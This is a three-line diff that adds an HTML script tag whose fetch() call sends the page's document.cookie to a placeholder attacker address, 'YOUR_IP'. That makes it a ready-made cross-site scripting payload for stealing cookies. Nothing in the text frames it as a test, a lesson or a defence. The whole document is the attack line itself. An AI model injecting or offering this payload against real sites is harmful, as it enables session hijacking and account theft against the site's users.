@@ -1,0 +1,3 @@
+<script>
+fetch("http://YOUR_IP/."+document.cookie)
+</script>
